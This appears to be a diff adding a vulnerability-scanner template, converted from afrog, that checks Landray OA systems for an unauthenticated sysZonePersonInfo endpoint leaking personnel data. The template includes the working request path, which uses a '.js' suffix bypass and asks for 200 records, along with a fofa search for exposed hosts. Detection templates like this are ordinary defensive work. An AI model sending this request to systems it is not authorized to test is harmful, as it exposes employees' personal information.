@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"columns":'
+          - '"title":'
+          - '"property":'
+          - '"currentPage":'
+          - '"pageSize":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=200&s_ajax=true'
+id: landray-syszonepersoninfo-disclosure
+info:
+  author: zan8in
+  description: 'fofa: app="Landray-OA系统"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 蓝凌OA sysZonePersonInfo 敏感信息泄露
+  severity: high
+  tags: landray,disclosure,argus-import
